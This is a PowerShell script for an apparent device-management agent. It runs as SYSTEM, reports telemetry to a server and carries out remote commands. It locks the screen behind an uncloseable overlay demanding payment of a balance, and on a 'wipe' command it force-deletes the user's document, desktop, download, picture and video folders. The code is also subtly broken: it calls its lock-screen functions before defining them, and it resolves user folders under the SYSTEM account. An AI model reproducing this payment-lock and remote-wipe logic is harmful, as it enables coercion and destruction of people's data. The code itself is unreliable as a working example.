# ScarletAgent.ps1 - Scarlet Technical Device Management Agent
# Runs as SYSTEM every 5 minutes via scheduled task
# Lock screen provides: override PIN, unlock request, make payment, call support

$AgentDir = "C:\Windows\System32\ScarletAgent"
$ConfigFile = "$AgentDir\config.json"
$StateFile = "$AgentDir\state.json"
$LogFile = "$AgentDir\agent.log"
$DeviceUuidFile = "$AgentDir\device_uuid.txt"
$LockFlagFile = "$AgentDir\locked.flag"
$MaxLogSize = 1MB

function Write-Log {
    param([string]$Msg)
    $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$ts $Msg" | Add-Content $LogFile -ErrorAction SilentlyContinue
    if ((Get-Item $LogFile -ErrorAction SilentlyContinue).Length -gt $MaxLogSize) {
        Move-Item $LogFile "$LogFile.old" -Force -ErrorAction SilentlyContinue
    }
}

function Invoke-AgentApi {
    param([string]$Endpoint, [hashtable]$Body)
    $Config = Get-Content $ConfigFile -ErrorAction SilentlyContinue | ConvertFrom-Json
    $ServerUrl = $Config.ServerUrl
    try {
        $json = $Body | ConvertTo-Json -Depth 5
        $resp = Invoke-RestMethod -Uri "$ServerUrl$Endpoint" -Method POST -Body $json -ContentType "application/json" -TimeoutSec 15
        return $resp
    } catch {
        Write-Log "API call to $Endpoint failed: $_"
        return $null
    }
}

# ─── Load config ──────────────────────────────────────────────────────────────
if (-not (Test-Path $ConfigFile)) { Write-Log "No config file found"; exit 1 }
$Config = Get-Content $ConfigFile | ConvertFrom-Json
$ServerUrl = $Config.ServerUrl
$Token = $Config.Token

# Generate or load persistent device UUID
if (-not (Test-Path $DeviceUuidFile)) {
    $Uuid = [guid]::NewGuid().ToString()
    $Uuid | Set-Content $DeviceUuidFile -Force
} else {
    $Uuid = (Get-Content $DeviceUuidFile).Trim()
}

# System info
$OsInfo = ""
try { $OsInfo = (Get-WmiObject Win32_OperatingSystem).Caption + " " + (Get-WmiObject Win32_OperatingSystem).Version }
catch { $OsInfo = "Windows" }
$HostnameVal = $env:COMPUTERNAME

# ─── Load or initialize state ────────────────────────────────────────────────
$DeviceToken = $null
if (Test-Path $StateFile) {
    try {
        $StateData = Get-Content $StateFile | ConvertFrom-Json
        $DeviceToken = $StateData.device_token
    } catch { }
}

# ─── Enroll if no device token ───────────────────────────────────────────────
if (-not $DeviceToken) {
    Write-Log "Enrolling device..."
    try {
        $Body = @{
            enrollment_token = $Token
            device_uuid = $Uuid
            hostname = $HostnameVal
            os_info = $OsInfo
            platform = "windows"
            agent_version = "1.0.0"
        } | ConvertTo-Json
        $Resp = Invoke-RestMethod -Uri "$ServerUrl/api/agent/enroll" -Method POST -Body $Body -ContentType "application/json" -TimeoutSec 30
        if ($Resp.device_token) {
            @{ device_token = $Resp.device_token; device_id = $Resp.device_id } | ConvertTo-Json | Set-Content $StateFile -Force
            $DeviceToken = $Resp.device_token
            Write-Log "Enrolled as device ID $($Resp.device_id)"
        }
    } catch {
        Write-Log "Enrollment failed: $_"
        exit 1
    }
}

# ─── Heartbeat ────────────────────────────────────────────────────────────────
try {
    # Collect telemetry
    $CpuUsage = ""
    $MemUsage = ""
    $DiskUsage = ""
    $BatteryLevel = ""
    $IpAddr = ""
    $UptimeSec = ""
    try { $CpuUsage = [math]::Round((Get-Counter '\Processor(_Total)\% Processor Time' -SampleInterval 1 -MaxSamples 1 -ErrorAction SilentlyContinue).CounterSamples.CookedValue, 1) } catch {}
    try {
        $os = Get-WmiObject Win32_OperatingSystem -ErrorAction SilentlyContinue
        if ($os) { $MemUsage = [math]::Round(($os.TotalVisibleMemorySize - $os.FreePhysicalMemory) / $os.TotalVisibleMemorySize * 100, 1) }
    } catch {}
    try {
        $disk = Get-WmiObject Win32_LogicalDisk -Filter "DeviceID='C:'" -ErrorAction SilentlyContinue
        if ($disk) { $DiskUsage = [math]::Round(($disk.Size - $disk.FreeSpace) / $disk.Size * 100, 1) }
    } catch {}
    try { $bat = Get-WmiObject Win32_Battery -ErrorAction SilentlyContinue; if ($bat) { $BatteryLevel = $bat.EstimatedChargeRemaining } } catch {}
    try { $IpAddr = (Get-NetIPAddress -AddressFamily IPv4 -Type Unicast -ErrorAction SilentlyContinue | Where-Object { $_.IPAddress -ne "127.0.0.1" } | Select-Object -First 1).IPAddress } catch {}
    try { $UptimeSec = [math]::Round((New-TimeSpan -Start (Get-WmiObject Win32_OperatingSystem).ConvertToDateTime((Get-WmiObject Win32_OperatingSystem).LastBootUpTime) -End (Get-Date)).TotalSeconds) } catch {}

    $HbBody = @{
        device_token = $DeviceToken
        device_uuid = $Uuid
        current_status = "online"
        hostname = $HostnameVal
        os_info = $OsInfo
        ip_address = "$IpAddr"
        uptime = "$UptimeSec"
        cpu_usage = "$CpuUsage"
        memory_usage = "$MemUsage"
        disk_usage = "$DiskUsage"
        battery = "$BatteryLevel"
        agent_version = "1.1.0"
    } | ConvertTo-Json

    $Resp = Invoke-RestMethod -Uri "$ServerUrl/api/agent/heartbeat" -Method POST -Body $HbBody -ContentType "application/json" -TimeoutSec 30
    Write-Log "Heartbeat OK. Lock: $($Resp.lock_status). Command: $($Resp.command.action)"

    # Save server-provided info for lock screen
    $PaymentUrl = $Resp.payment_url
    $SupportPhone = if ($Resp.support_phone) { $Resp.support_phone } else { "(765) 555-0100" }

    $NewLockStatus = $Resp.lock_status
    $Result = "success"

    if ($Resp.command) {
        $Cmd = $Resp.command

        if ($Cmd.action -eq "lock") {
            Write-Log "Executing LOCK command"
            $NewLockStatus = "locked"
            Set-Content $LockFlagFile "locked" -Force
            $LockMsg = if ($Cmd.message) { $Cmd.message } else { "This device has been locked by Scarlet Technical. Resolve your balance to regain access." }
            Show-LockScreen -Message $LockMsg -PaymentUrl $PaymentUrl -SupportPhone $SupportPhone

        } elseif ($Cmd.action -eq "unlock") {
            Write-Log "Executing UNLOCK command"
            $NewLockStatus = "unlocked"
            Remove-Item $LockFlagFile -Force -ErrorAction SilentlyContinue
            Stop-LockScreen

        } elseif ($Cmd.action -eq "wipe") {
            Write-Log "Executing WIPE command"
            $NewLockStatus = "wiped"
            # Acknowledge before wipe
            $AckBody = @{
                device_token = $DeviceToken; device_uuid = $Uuid
                command_id = $Cmd.id; result = "success"; new_lock_status = "wiped"
            } | ConvertTo-Json
            Invoke-RestMethod -Uri "$ServerUrl/api/agent/command-ack" -Method POST -Body $AckBody -ContentType "application/json" -TimeoutSec 30 | Out-Null
            # Wipe user data
            $dirs = @("$env:USERPROFILE\Documents", "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Pictures", "$env:USERPROFILE\Videos")
            foreach ($d in $dirs) {
                if (Test-Path $d) { Get-ChildItem $d | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue }
            }
            Write-Log "Wipe completed"
            return
        }

        # Acknowledge command
        $AckBody = @{
            device_token = $DeviceToken
            device_uuid = $Uuid
            command_id = $Cmd.id
            result = $Result
            new_lock_status = $NewLockStatus
        } | ConvertTo-Json
        Invoke-RestMethod -Uri "$ServerUrl/api/agent/command-ack" -Method POST -Body $AckBody -ContentType "application/json" -TimeoutSec 30 | Out-Null
        Write-Log "Command $($Cmd.action) acknowledged"
    }

    # Re-enforce lock if device is locked and no command was just processed
    if ($Resp.lock_status -eq "locked" -and -not $Resp.command) {
        $LockRunning = $false
        if (Test-Path $LockFlagFile) {
            $LockRunning = (Get-Job | Where-Object { $_.State -eq "Running" }).Count -gt 0
        }
        if (-not $LockRunning) {
            Set-Content $LockFlagFile "locked" -Force
            $DefaultMsg = "This device has been locked by Scarlet Technical. Resolve your balance to regain access."
            Show-LockScreen -Message $DefaultMsg -PaymentUrl $PaymentUrl -SupportPhone $SupportPhone
            Write-Log "Re-applied lock overlay"
        }
    }

} catch {
    Write-Log "Heartbeat failed: $_"
}

# ─── Lock Screen Functions ────────────────────────────────────────────────────

function Show-LockScreen {
    param(
        [string]$Message,
        [string]$PaymentUrl,
        [string]$SupportPhone
    )

    # Kill any existing lock overlay
    Stop-LockScreen

    $ShowLockBlock = {
        param($LockMessage, $PayUrl, $Phone, $SrvUrl, $DevToken, $DevUuid)

        Add-Type -AssemblyName PresentationFramework, PresentationCore, WindowsBase, System.Windows.Forms

        function Invoke-LockApi {
            param([string]$Endpoint, [string]$JsonBody)
            try {
                $wc = New-Object System.Net.WebClient
                $wc.Headers.Add("Content-Type", "application/json")
                return $wc.UploadString("$SrvUrl$Endpoint", $JsonBody)
            } catch {
                return '{"error":"Network error"}'
            }
        }

        try {
            $app = [System.Windows.Application]::new()
            $win = New-Object System.Windows.Window
            $win.WindowStyle = "None"
            $win.ResizeMode = "NoResize"
            $win.WindowState = "Maximized"
            $win.Topmost = $true
            $win.Background = [System.Windows.Media.Brushes]::Black
            $win.Title = "DEVICE LOCKED"

            $scroll = New-Object System.Windows.Controls.ScrollViewer
            $scroll.VerticalScrollBarVisibility = "Auto"
            $scroll.HorizontalScrollBarVisibility = "Disabled"

            $panel = New-Object System.Windows.Controls.StackPanel
            $panel.VerticalAlignment = "Center"
            $panel.HorizontalAlignment = "Center"
            $panel.Margin = [System.Windows.Thickness]::new(40, 60, 40, 40)
            $panel.MaxWidth = 700

            # Lock icon + title
            $t1 = New-Object System.Windows.Controls.TextBlock
            $t1.Text = [char]0x1F512 + "  DEVICE LOCKED"
            $t1.FontSize = 42; $t1.FontWeight = "Bold"; $t1.Foreground = [System.Windows.Media.Brushes]::Red
            $t1.TextAlignment = "Center"; $t1.Margin = [System.Windows.Thickness]::new(0,0,0,8)
            $panel.Children.Add($t1) | Out-Null

            $t2 = New-Object System.Windows.Controls.TextBlock
            $t2.Text = "Scarlet Technical"; $t2.FontSize = 20
            $t2.Foreground = [System.Windows.Media.Brushes]::White; $t2.TextAlignment = "Center"
            $t2.Margin = [System.Windows.Thickness]::new(0,0,0,16)
            $panel.Children.Add($t2) | Out-Null

            $t3 = New-Object System.Windows.Controls.TextBlock
            $t3.Text = $LockMessage; $t3.FontSize = 15
            $t3.Foreground = [System.Windows.Media.Brushes]::White; $t3.TextWrapping = "Wrap"
            $t3.TextAlignment = "Center"; $t3.Margin = [System.Windows.Thickness]::new(0,0,0,24)
            $panel.Children.Add($t3) | Out-Null

            # Divider
            $div1 = New-Object System.Windows.Controls.Border
            $div1.Background = [System.Windows.Media.SolidColorBrush]::new([System.Windows.Media.Color]::FromRgb(51,51,51))
            $div1.Height = 1; $div1.Margin = [System.Windows.Thickness]::new(0,0,0,20)
            $panel.Children.Add($div1) | Out-Null

            # PIN label
            $pinLabel = New-Object System.Windows.Controls.TextBlock
            $pinLabel.Text = "Have an override PIN?"; $pinLabel.FontSize = 12
            $pinLabel.Foreground = [System.Windows.Media.SolidColorBrush]::new([System.Windows.Media.Color]::FromRgb(170,170,170))
            $pinLabel.TextAlignment = "Center"; $pinLabel.Margin = [System.Windows.Thickness]::new(0,0,0,8)
            $panel.Children.Add($pinLabel) | Out-Null

            # PIN row
            $pinRow = New-Object System.Windows.Controls.StackPanel
            $pinRow.Orientation = "Horizontal"; $pinRow.HorizontalAlignment = "Center"
            $pinRow.Margin = [System.Windows.Thickness]::new(0,0,0,4)

            $pinBox = New-Object System.Windows.Controls.TextBox
            $pinBox.Width = 180; $pinBox.FontSize = 20; $pinBox.MaxLength = 6
            $pinBox.Background = [System.Windows.Media.SolidColorBrush]::new([System.Windows.Media.Color]::FromRgb(42,42,42))
            $pinBox.Foreground = [System.Windows.Media.Brushes]::White
            $pinBox.TextAlignment = "Center"; $pinBox.Padding = [System.Windows.Thickness]::new(8)
            $pinBox.BorderBrush = [System.Windows.Media.SolidColorBrush]::new([System.Windows.Media.Color]::FromRgb(68,68,68))
            $pinRow.Children.Add($pinBox) | Out-Null

            $pinBtn = New-Object System.Windows.Controls.Button
            $pinBtn.Content = "UNLOCK"; $pinBtn.FontSize = 14; $pinBtn.FontWeight = "Bold"
            $pinBtn.Foreground = [System.Windows.Media.Brushes]::White
            $pinBtn.Background = [System.Windows.Media.SolidColorBrush]::new([System.Windows.Media.Color]::FromRgb(220,20,60))
            $pinBtn.Padding = [System.Windows.Thickness]::new(20,8,20,8)
            $pinBtn.Margin = [System.Windows.Thickness]::new(8,0,0,0)
            $pinBtn.Cursor = [System.Windows.Input.Cursors]::Hand
            $pinRow.Children.Add($pinBtn) | Out-Null

            $panel.Children.Add($pinRow) | Out-Null

            $pinStatus = New-Object System.Windows.Controls.TextBlock
            $pinStatus.Text = ""; $pinStatus.FontSize = 12
            $pinStatus.Foreground = [System.Windows.Media.Brushes]::Gray; $pinStatus.TextAlignment = "Center"
            $pinStatus.Margin = [System.Windows.Thickness]::new(0,2,0,16)
            $panel.Children.Add($pinStatus) | Out-Null

            # PIN button handler
            $pinBtn.Add_Click({
                $pin = $pinBox.Text.Trim()
                if (-not $pin) { $pinStatus.Text = "Enter the 6-digit PIN from your technician."; $pinStatus.Foreground = [System.Windows.Media.Brushes]::OrangeRed; return }
                $pinStatus.Text = "Verifying..."; $pinStatus.Foreground = [System.Windows.Media.Brushes]::Gray
                $json = "{`"device_token`":`"$DevToken`",`"device_uuid`":`"$DevUuid`",`"pin`":`"$pin`"}"
                $result = Invoke-LockApi "/api/agent/verify-pin" $json
                $parsed = $result | ConvertFrom-Json
                if ($parsed.success -eq $true) {
                    $pinStatus.Text = [char]0x2713 + " Device unlocked!"; $pinStatus.Foreground = [System.Windows.Media.Brushes]::LimeGreen
                    Remove-Item "C:\Windows\System32\ScarletAgent\locked.flag" -Force -ErrorAction SilentlyContinue
                    Start-Sleep -Seconds 1
                    $win.Close()
                } else {
                    $pinBox.Text = ""
                    $msg = if ($parsed.error) { $parsed.error } else { "Invalid PIN" }
                    $pinStatus.Text = $msg; $pinStatus.Foreground = [System.Windows.Media.Brushes]::OrangeRed
                }
            })

            # Divider
            $div2 = New-Object System.Windows.Controls.Border
            $div2.Background = [System.Windows.Media.SolidColorBrush]::new([System.Windows.Media.Color]::FromRgb(51,51,51))
            $div2.Height = 1; $div2.Margin = [System.Windows.Thickness]::new(0,0,0,20)
            $panel.Children.Add($div2) | Out-Null

            # Action buttons
            function New-ActionButton { param($Text, $R, $G, $B, $Handler)
                $btn = New-Object System.Windows.Controls.Button
                $btn.Content = $Text; $btn.FontSize = 14
                $btn.Foreground = [System.Windows.Media.Brushes]::White
                $btn.Background = [System.Windows.Media.SolidColorBrush]::new([System.Windows.Media.Color]::FromRgb($R,$G,$B))
                $btn.Padding = [System.Windows.Thickness]::new(0,12,0,12)
                $btn.Margin = [System.Windows.Thickness]::new(0,4,0,4)
                $btn.Cursor = [System.Windows.Input.Cursors]::Hand
                $btn.HorizontalContentAlignment = "Center"
                $btn.Add_Click($Handler)
                return $btn
            }

            # Make Payment button
            $payBtn = New-ActionButton "$([char]0x1F4B3)  Make a Payment" 30 142 62 {
                if ($PayUrl) {
                    Start-Process $PayUrl
                } else {
                    [System.Windows.MessageBox]::Show("Payment URL not available. Call support.", "Payment")
                }
            }
            $panel.Children.Add($payBtn) | Out-Null

            # Request Unlock button
            $unlockBtn = New-ActionButton "$([char]0x1F513)  Request Unlock" 26 115 232 {
                $inputWin = New-Object System.Windows.Window
                $inputWin.Title = "Request Unlock"; $inputWin.Width = 400; $inputWin.Height = 250
                $inputWin.WindowStartupLocation = "CenterScreen"; $inputWin.Topmost = $true
                $inputWin.Background = [System.Windows.Media.SolidColorBrush]::new([System.Windows.Media.Color]::FromRgb(30,30,30))
                $inputPanel = New-Object System.Windows.Controls.StackPanel
                $inputPanel.Margin = [System.Windows.Thickness]::new(20)
                $lbl1 = New-Object System.Windows.Controls.TextBlock; $lbl1.Text = "Reason:"; $lbl1.Foreground = [System.Windows.Media.Brushes]::White; $lbl1.Margin = [System.Windows.Thickness]::new(0,0,0,4)
                $reasonBox = New-Object System.Windows.Controls.TextBox; $reasonBox.Height = 30; $reasonBox.FontSize = 13; $reasonBox.Margin = [System.Windows.Thickness]::new(0,0,0,8)
                $lbl2 = New-Object System.Windows.Controls.TextBlock; $lbl2.Text = "Your phone or email:"; $lbl2.Foreground = [System.Windows.Media.Brushes]::White; $lbl2.Margin = [System.Windows.Thickness]::new(0,0,0,4)
                $contactBox = New-Object System.Windows.Controls.TextBox; $contactBox.Height = 30; $contactBox.FontSize = 13; $contactBox.Margin = [System.Windows.Thickness]::new(0,0,0,12)
                $submitBtn = New-Object System.Windows.Controls.Button; $submitBtn.Content = "Submit Request"; $submitBtn.Height = 36
                $submitBtn.Background = [System.Windows.Media.SolidColorBrush]::new([System.Windows.Media.Color]::FromRgb(26,115,232))
                $submitBtn.Foreground = [System.Windows.Media.Brushes]::White; $submitBtn.FontSize = 13
                $submitBtn.Add_Click({
                    $reason = $reasonBox.Text; $contact = $contactBox.Text
                    $json = "{`"device_token`":`"$DevToken`",`"device_uuid`":`"$DevUuid`",`"reason`":`"$reason`",`"contact_info`":`"$contact`"}"
                    $result = Invoke-LockApi "/api/agent/unlock-request" $json
                    $parsed = $result | ConvertFrom-Json
                    $msg = if ($parsed.message) { $parsed.message } else { $parsed.error }
                    [System.Windows.MessageBox]::Show($msg, "Unlock Request")
                    $inputWin.Close()
                })
                $inputPanel.Children.Add($lbl1) | Out-Null; $inputPanel.Children.Add($reasonBox) | Out-Null
                $inputPanel.Children.Add($lbl2) | Out-Null; $inputPanel.Children.Add($contactBox) | Out-Null
                $inputPanel.Children.Add($submitBtn) | Out-Null
                $inputWin.Content = $inputPanel; $inputWin.ShowDialog() | Out-Null
            }
            $panel.Children.Add($unlockBtn) | Out-Null

            # Call Support button
            $callBtn = New-ActionButton "$([char]0x1F4DE)  Call Support: $Phone" 68 68 68 {
                [System.Windows.MessageBox]::Show("Call Scarlet Technical:`n$Phone", "Support")
            }
            $panel.Children.Add($callBtn) | Out-Null

            # Footer
            $footer = New-Object System.Windows.Controls.TextBlock
            $footer.Text = "Support: $Phone"; $footer.FontSize = 13; $footer.FontWeight = "Bold"
            $footer.Foreground = [System.Windows.Media.Brushes]::Yellow; $footer.TextAlignment = "Center"
            $footer.Margin = [System.Windows.Thickness]::new(0,20,0,4)
            $panel.Children.Add($footer) | Out-Null

            $legal = New-Object System.Windows.Controls.TextBlock
            $legal.Text = "This device is managed by Scarlet Technical`nUnauthorized use is prohibited"
            $legal.FontSize = 9; $legal.Foreground = [System.Windows.Media.SolidColorBrush]::new([System.Windows.Media.Color]::FromRgb(102,102,102))
            $legal.TextAlignment = "Center"
            $panel.Children.Add($legal) | Out-Null

            $scroll.Content = $panel
            $win.Content = $scroll

            # Block close
            $win.add_Closing({ param($s, $e)
                if (Test-Path "C:\Windows\System32\ScarletAgent\locked.flag") { $e.Cancel = $true }
            })
            $win.add_PreviewKeyDown({
                if ($_.Key -eq "F4" -and $_.KeyboardDevice.Modifiers -eq "Alt") { $_.Handled = $true }
                if ($_.Key -eq "Escape") { $_.Handled = $true }
            })

            $win.ShowDialog() | Out-Null
        } catch { }
    }

    Start-Job -ScriptBlock $ShowLockBlock -ArgumentList $Message, $PaymentUrl, $SupportPhone, $ServerUrl, $DeviceToken, $Uuid | Out-Null
}

function Stop-LockScreen {
    Remove-Item $LockFlagFile -Force -ErrorAction SilentlyContinue
    Get-Job | Where-Object { $_.State -eq "Running" } | Stop-Job -PassThru | Remove-Job -Force -ErrorAction SilentlyContinue
    Get-Process -Name "powershell" -ErrorAction SilentlyContinue |
        Where-Object { $_.MainWindowTitle -like "*DEVICE LOCKED*" } |
        Stop-Process -Force -ErrorAction SilentlyContinue
}
